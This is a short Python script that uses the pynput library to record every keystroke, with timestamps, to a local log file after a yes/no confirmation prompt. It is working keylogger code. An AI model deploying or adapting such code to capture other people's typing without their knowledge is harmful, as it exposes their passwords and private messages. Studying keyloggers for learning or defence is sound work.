from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

try:
    # Ask for user's permission
    confirmation = input("Do you want to start the keylogger? (yes/no): ").lower()

    if confirmation == "yes":
        with Listener(on_press=on_press) as listener:
            print("Keylogger started. Press Ctrl+C to exit.")
            listener.join()
    else:
        print("Keylogger not started. Exiting.")

except KeyboardInterrupt:
    print("Ctrl+C pressed. Exiting.")
except Exception as e:
    print(f"An error occurred: {e}")
